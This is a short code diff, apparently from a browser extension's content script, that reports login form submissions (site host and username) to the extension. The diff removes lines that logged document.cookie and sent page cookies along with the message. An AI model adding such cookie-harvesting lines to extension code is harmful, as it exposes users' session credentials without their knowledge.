@@ -65,9 +65,7 @@ if (window === window.top) {
                 }
             }
             if (hasLogin) {
-                console.log(document.cookie);
                 extension.runtime.sendMessage('newFormSubmitted', {
-                    'cookies': document.cookie,
                     'update': {
                         'website': window.location.host,
                         'username': username,
